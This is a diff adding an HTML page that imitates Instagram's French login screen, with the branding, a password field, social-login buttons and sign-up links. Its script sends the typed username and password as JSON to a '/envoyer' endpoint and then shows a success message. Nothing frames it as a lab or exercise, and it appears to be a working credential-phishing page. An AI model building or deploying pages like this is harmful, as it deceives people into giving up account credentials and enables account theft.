@@ -1,0 +1,749 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram — Connexion</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=DM+Sans:wght@400;500;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      :root {
+        --pink: #f857a6;
+        --orange: #ff5858;
+        --yellow: #ffd166;
+        --purple: #a855f7;
+        --blue: #3b82f6;
+        --card-bg: rgba(255, 255, 255, 0.12);
+        --card-border: rgba(255, 255, 255, 0.25);
+        --input-bg: rgba(255, 255, 255, 0.15);
+        --input-border: rgba(255, 255, 255, 0.3);
+        --text: #fff;
+        --text-muted: rgba(255, 255, 255, 0.65);
+      }
+
+      body {
+        min-height: 100vh;
+        font-family: "DM Sans", sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        background: #0f0c1a;
+      }
+
+      /* ── Animated mesh background ── */
+      .bg {
+        position: fixed;
+        inset: 0;
+        z-index: 0;
+        background:
+          radial-gradient(
+            ellipse 80% 60% at 20% 10%,
+            #f857a640 0%,
+            transparent 60%
+          ),
+          radial-gradient(
+            ellipse 60% 80% at 80% 90%,
+            #3b82f650 0%,
+            transparent 55%
+          ),
+          radial-gradient(
+            ellipse 70% 50% at 70% 20%,
+            #a855f740 0%,
+            transparent 50%
+          ),
+          radial-gradient(
+            ellipse 50% 70% at 10% 80%,
+            #ff585840 0%,
+            transparent 50%
+          ),
+          radial-gradient(
+            ellipse 90% 90% at 50% 50%,
+            #ffd16610 0%,
+            transparent 70%
+          );
+        animation: shift 12s ease-in-out infinite alternate;
+      }
+      @keyframes shift {
+        0% {
+          filter: hue-rotate(0deg) brightness(1);
+        }
+        100% {
+          filter: hue-rotate(30deg) brightness(1.1);
+        }
+      }
+
+      /* Floating blobs */
+      .blob {
+        position: fixed;
+        border-radius: 50%;
+        filter: blur(80px);
+        opacity: 0.35;
+        animation: float linear infinite;
+      }
+      .blob-1 {
+        width: 420px;
+        height: 420px;
+        background: var(--pink);
+        top: -100px;
+        left: -80px;
+        animation-duration: 18s;
+      }
+      .blob-2 {
+        width: 350px;
+        height: 350px;
+        background: var(--blue);
+        bottom: -80px;
+        right: -60px;
+        animation-duration: 22s;
+        animation-direction: reverse;
+      }
+      .blob-3 {
+        width: 280px;
+        height: 280px;
+        background: var(--purple);
+        top: 40%;
+        left: 60%;
+        animation-duration: 15s;
+      }
+
+      @keyframes float {
+        0% {
+          transform: translate(0, 0) rotate(0deg);
+        }
+        33% {
+          transform: translate(30px, -20px) rotate(120deg);
+        }
+        66% {
+          transform: translate(-20px, 30px) rotate(240deg);
+        }
+        100% {
+          transform: translate(0, 0) rotate(360deg);
+        }
+      }
+
+      /* ── Layout ── */
+      .page {
+        position: relative;
+        z-index: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        width: 100%;
+        padding: 2rem;
+      }
+
+      .wrapper {
+        display: flex;
+        gap: 3rem;
+        align-items: center;
+        max-width: 860px;
+        width: 100%;
+      }
+
+      /* ── Phone mockup (desktop only) ── */
+      .phone-mockup {
+        flex-shrink: 0;
+        width: 220px;
+        height: 420px;
+        background: rgba(255, 255, 255, 0.07);
+        border: 1.5px solid var(--card-border);
+        border-radius: 32px;
+        backdrop-filter: blur(20px);
+        padding: 14px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        box-shadow:
+          0 32px 64px rgba(0, 0, 0, 0.4),
+          inset 0 1px 0 rgba(255, 255, 255, 0.15);
+        animation: slideIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) both;
+      }
+      .phone-bar {
+        height: 20px;
+        background: rgba(255, 255, 255, 0.06);
+        border-radius: 8px;
+      }
+      .phone-bar.wide {
+        flex: 1;
+      }
+      .phone-img-slot {
+        flex: 2;
+        border-radius: 16px;
+        background: linear-gradient(
+          135deg,
+          #f857a6 0%,
+          #ff5858 40%,
+          #ffd166 100%
+        );
+        opacity: 0.8;
+      }
+      .phone-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr 1fr;
+        gap: 6px;
+        padding-top: 4px;
+      }
+      .phone-thumb {
+        aspect-ratio: 1;
+        border-radius: 8px;
+        background: linear-gradient(
+          135deg,
+          hsl(calc(var(--h) * 1deg), 70%, 60%) 0%,
+          hsl(calc(var(--h) * 1deg + 40), 80%, 50%) 100%
+        );
+        opacity: 0.75;
+      }
+      .phone-thumb:nth-child(1) {
+        --h: 320;
+      }
+      .phone-thumb:nth-child(2) {
+        --h: 190;
+      }
+      .phone-thumb:nth-child(3) {
+        --h: 260;
+      }
+      .phone-thumb:nth-child(4) {
+        --h: 20;
+      }
+      .phone-thumb:nth-child(5) {
+        --h: 140;
+      }
+      .phone-thumb:nth-child(6) {
+        --h: 60;
+      }
+
+      /* ── Card ── */
+      .card {
+        flex: 1;
+        min-width: 0;
+        background: var(--card-bg);
+        border: 1.5px solid var(--card-border);
+        border-radius: 24px;
+        backdrop-filter: blur(32px);
+        padding: 2.5rem 2rem;
+        box-shadow:
+          0 32px 80px rgba(0, 0, 0, 0.35),
+          inset 0 1px 0 rgba(255, 255, 255, 0.18);
+        animation: slideIn 0.7s cubic-bezier(0.16, 1, 0.3, 1) 0.1s both;
+      }
+
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateY(24px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      /* ── Logo ── */
+      .logo-wrap {
+        text-align: center;
+        margin-bottom: 1.75rem;
+      }
+      .logo-icon {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 56px;
+        height: 56px;
+        border-radius: 16px;
+        background: linear-gradient(
+          135deg,
+          var(--pink) 0%,
+          var(--orange) 50%,
+          var(--yellow) 100%
+        );
+        margin-bottom: 0.75rem;
+        box-shadow: 0 8px 24px rgba(248, 87, 166, 0.5);
+      }
+      .logo-icon svg {
+        width: 28px;
+        height: 28px;
+        stroke: #fff;
+        fill: none;
+        stroke-width: 2;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+      }
+      .logo-name {
+        font-family: "Playfair Display", serif;
+        font-size: 1.9rem;
+        color: #fff;
+        letter-spacing: -0.5px;
+      }
+      .logo-name span {
+        background: linear-gradient(
+          90deg,
+          var(--pink),
+          var(--orange),
+          var(--yellow)
+        );
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+
+      /* ── Divider text ── */
+      .tagline {
+        text-align: center;
+        color: var(--text-muted);
+        font-size: 0.8rem;
+        margin-bottom: 1.5rem;
+        letter-spacing: 0.04em;
+        text-transform: uppercase;
+      }
+
+      /* ── Form ── */
+      .form {
+        display: flex;
+        flex-direction: column;
+        gap: 0.85rem;
+      }
+
+      .field {
+        position: relative;
+      }
+      .field input {
+        width: 100%;
+        padding: 0.8rem 1rem 0.8rem 2.8rem;
+        background: var(--input-bg);
+        border: 1.5px solid var(--input-border);
+        border-radius: 12px;
+        color: #fff;
+        font-family: "DM Sans", sans-serif;
+        font-size: 0.9rem;
+        outline: none;
+        transition:
+          border-color 0.2s,
+          background 0.2s,
+          box-shadow 0.2s;
+      }
+      .field input::placeholder {
+        color: rgba(255, 255, 255, 0.4);
+      }
+      .field input:focus {
+        border-color: rgba(248, 87, 166, 0.7);
+        background: rgba(255, 255, 255, 0.2);
+        box-shadow: 0 0 0 3px rgba(248, 87, 166, 0.15);
+      }
+      .field-icon {
+        position: absolute;
+        left: 0.85rem;
+        top: 50%;
+        transform: translateY(-50%);
+        color: rgba(255, 255, 255, 0.4);
+        pointer-events: none;
+      }
+      .field-icon svg {
+        width: 16px;
+        height: 16px;
+        stroke: currentColor;
+        fill: none;
+        stroke-width: 2;
+        stroke-linecap: round;
+      }
+
+      /* Show/hide password */
+      .toggle-pw {
+        position: absolute;
+        right: 0.85rem;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: rgba(255, 255, 255, 0.45);
+        transition: color 0.2s;
+      }
+      .toggle-pw:hover {
+        color: rgba(255, 255, 255, 0.8);
+      }
+      .toggle-pw svg {
+        width: 16px;
+        height: 16px;
+        stroke: currentColor;
+        fill: none;
+        stroke-width: 2;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+        display: block;
+      }
+
+      .forgot {
+        text-align: right;
+        margin-top: -0.3rem;
+      }
+      .forgot a {
+        font-size: 0.78rem;
+        color: var(--text-muted);
+        text-decoration: none;
+        transition: color 0.2s;
+      }
+      .forgot a:hover {
+        color: #fff;
+      }
+
+      /* ── Submit button ── */
+      .btn-login {
+        margin-top: 0.4rem;
+        padding: 0.85rem;
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+        font-family: "DM Sans", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 600;
+        color: #fff;
+        letter-spacing: 0.02em;
+        background: linear-gradient(
+          135deg,
+          var(--pink) 0%,
+          var(--orange) 60%,
+          var(--yellow) 100%
+        );
+        background-size: 200% 200%;
+        box-shadow: 0 8px 24px rgba(248, 87, 166, 0.45);
+        transition:
+          transform 0.15s,
+          box-shadow 0.2s,
+          background-position 0.4s;
+        position: relative;
+        overflow: hidden;
+      }
+      .btn-login::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(rgba(255, 255, 255, 0.12), transparent);
+      }
+      .btn-login:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 32px rgba(248, 87, 166, 0.6);
+        background-position: right center;
+      }
+      .btn-login:active {
+        transform: translateY(0);
+      }
+
+      /* ── OR separator ── */
+      .or {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        color: var(--text-muted);
+        font-size: 0.78rem;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        margin: 0.25rem 0;
+      }
+      .or::before,
+      .or::after {
+        content: "";
+        flex: 1;
+        height: 1px;
+        background: linear-gradient(
+          to right,
+          transparent,
+          rgba(255, 255, 255, 0.2),
+          transparent
+        );
+      }
+
+      /* ── Social buttons ── */
+      .social-row {
+        display: flex;
+        gap: 0.75rem;
+      }
+      .btn-social {
+        flex: 1;
+        padding: 0.7rem;
+        border-radius: 12px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        font-family: "DM Sans", sans-serif;
+        font-size: 0.82rem;
+        font-weight: 500;
+        border: 1.5px solid var(--card-border);
+        background: var(--input-bg);
+        color: #fff;
+        transition:
+          background 0.2s,
+          border-color 0.2s,
+          transform 0.15s;
+      }
+      .btn-social:hover {
+        background: rgba(255, 255, 255, 0.22);
+        border-color: rgba(255, 255, 255, 0.4);
+        transform: translateY(-1px);
+      }
+      .btn-social svg {
+        width: 16px;
+        height: 16px;
+      }
+
+      /* ── Footer links ── */
+      .footer-links {
+        margin-top: 1.5rem;
+        text-align: center;
+        font-size: 0.82rem;
+        color: var(--text-muted);
+      }
+      .footer-links a {
+        color: #fff;
+        text-decoration: none;
+        font-weight: 600;
+        transition: opacity 0.2s;
+      }
+      .footer-links a:hover {
+        opacity: 0.75;
+      }
+
+      .divider-link {
+        margin-top: 0.85rem;
+        padding-top: 0.85rem;
+        border-top: 1px solid var(--card-border);
+        font-size: 0.78rem;
+        color: var(--text-muted);
+        text-align: center;
+      }
+      .divider-link a {
+        color: #fff;
+        font-weight: 600;
+        text-decoration: none;
+      }
+
+      /* ── Responsive ── */
+      @media (max-width: 640px) {
+        .phone-mockup {
+          display: none;
+        }
+        .wrapper {
+          max-width: 380px;
+        }
+        .card {
+          padding: 2rem 1.5rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="bg"></div>
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+
+    <div class="page">
+      <div class="wrapper">
+        <!-- Phone mockup -->
+        <!-- <div class="phone-mockup">
+          <div
+            class="phone-bar"
+            style="
+              width: 40%;
+              align-self: center;
+              height: 6px;
+              background: rgba(255, 255, 255, 0.15);
+              border-radius: 4px;
+              margin-bottom: 4px;
+            "
+          ></div>
+          <div class="phone-img-slot"></div>
+          <div class="phone-grid">
+            <div class="phone-thumb"></div>
+            <div class="phone-thumb"></div>
+            <div class="phone-thumb"></div>
+            <div class="phone-thumb"></div>
+            <div class="phone-thumb"></div>
+            <div class="phone-thumb"></div>
+          </div>
+          <div class="phone-bar"></div>
+          <div class="phone-bar" style="width: 60%"></div>
+        </div> -->
+
+        <!-- Login card -->
+        <div class="card">
+          <div class="logo-wrap">
+            <div class="logo-icon">
+              <!-- Camera icon -->
+              <svg viewBox="0 0 24 24">
+                <rect x="2" y="6" width="20" height="15" rx="3" />
+                <circle cx="12" cy="13.5" r="3.5" />
+                <path d="M8 6l1.5-3h5L16 6" />
+              </svg>
+            </div>
+            <div class="logo-name"><span>Insta</span>gram</div>
+          </div>
+
+          <p class="tagline">Connecte-toi pour voir les photos de tes amis</p>
+
+          <form class="form" onsubmit="handleLogin(event)">
+            <div class="field">
+              <span class="field-icon">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"
+                  />
+                  <polyline points="22,6 12,13 2,6" />
+                </svg>
+              </span>
+              <input
+                type="text"
+                id="username"
+                placeholder="Email, téléphone ou pseudo"
+                autocomplete="username"
+              />
+            </div>
+
+            <div class="field">
+              <span class="field-icon">
+                <svg viewBox="0 0 24 24">
+                  <rect x="3" y="11" width="18" height="11" rx="2" />
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                </svg>
+              </span>
+              <input
+                type="password"
+                id="password"
+                placeholder="Mot de passe"
+                autocomplete="current-password"
+              />
+              <button
+                type="button"
+                class="toggle-pw"
+                onclick="togglePw()"
+                id="toggle-btn"
+                aria-label="Afficher le mot de passe"
+              >
+                <svg id="eye-icon" viewBox="0 0 24 24">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                  <circle cx="12" cy="12" r="3" />
+                </svg>
+              </button>
+            </div>
+
+            <div class="forgot">
+              <a href="#">Mot de passe oublié ?</a>
+            </div>
+
+            <button type="submit" class="btn-login">Se connecter</button>
+
+            <div class="or">ou</div>
+
+            <div class="social-row">
+              <button type="button" class="btn-social">
+                <!-- Google G -->
+                <svg viewBox="0 0 24 24" fill="none">
+                  <path
+                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                    fill="#4285F4"
+                  />
+                  <path
+                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                    fill="#34A853"
+                  />
+                  <path
+                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
+                    fill="#FBBC05"
+                  />
+                  <path
+                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
+                    fill="#EA4335"
+                  />
+                </svg>
+                Google
+              </button>
+              <button type="button" class="btn-social">
+                <!-- Facebook F -->
+                <svg viewBox="0 0 24 24" fill="#1877F2">
+                  <path
+                    d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"
+                  />
+                </svg>
+                Facebook
+              </button>
+            </div>
+          </form>
+
+          <div class="footer-links">
+            Pas encore de compte ? <a href="#">S'inscrire</a>
+          </div>
+          <div class="divider-link">
+            <a href="#">Télécharger l'application</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function togglePw() {
+        const input = document.getElementById("password");
+        const icon = document.getElementById("eye-icon");
+        if (input.type === "password") {
+          input.type = "text";
+          icon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>`;
+        } else {
+          input.type = "password";
+          icon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+        }
+      }
+
+      async function handleLogin(e) {
+        e.preventDefault();
+        const btn = e.target.querySelector(".btn-login");
+        const passwordInput = e.target.querySelector("#password");
+        const userNameInput = e.target.querySelector("#username");
+
+        btn.textContent = "Connexion…";
+        btn.style.opacity = "0.8";
+
+        try {
+          const response = await fetch("/envoyer", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              username: userNameInput.value,
+              password: passwordInput.value,
+            }),
+          });
+
+          if (response.ok) {
+            btn.textContent = "✓ Connecté !";
+            btn.style.background = "linear-gradient(135deg, #10b981, #059669)";
+            btn.style.boxShadow = "0 8px 24px rgba(16,185,129,0.4)";
+          } else {
+            btn.textContent = "Identifiants incorrects";
+            btn.style.background = "linear-gradient(135deg, #ef4444, #dc2626)";
+          }
+        } catch (error) {
+          btn.textContent = "Serveur introuvable";
+          btn.style.background = "linear-gradient(135deg, #ef4444, #dc2626)";
+          console.log(error);
+        } finally {
+          btn.style.opacity = "1";
+          setTimeout(() => {
+            btn.textContent = "Se connecter";
+            btn.style.background = "";
+            btn.style.boxShadow = "";
+          }, 2000);
+        }
+      }
+    </script>
+  </body>
+</html>
